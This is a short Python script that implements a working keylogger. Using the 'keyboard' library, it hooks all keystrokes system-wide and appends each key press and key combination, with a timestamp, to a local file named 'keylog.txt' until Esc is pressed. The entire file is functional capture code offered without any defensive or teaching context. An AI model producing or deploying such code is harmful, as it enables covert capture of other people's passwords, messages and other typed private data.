import keyboard
from time import strftime

log_file = "keylog.txt"
combination_keys = set()


def log_keys(event):
    global combination_keys
    timestamp = strftime("[%Y-%m-%d %H:%M:%S]")

    try:
        with open(log_file, "a") as f:
            if event.event_type == "down":
                combination_keys.add(event.name)

                if len(combination_keys) > 1:
                    f.write(f"\n{timestamp}: {' + '.join(combination_keys)}")
                else:
                    f.write(f"\n{timestamp}: {event.name}")

            elif event.event_type == "up":
                combination_keys.discard(event.name)

    except Exception as e:
        print(f"{timestamp}: Error: {e}")


keyboard.hook(log_keys)
keyboard.wait("esc")
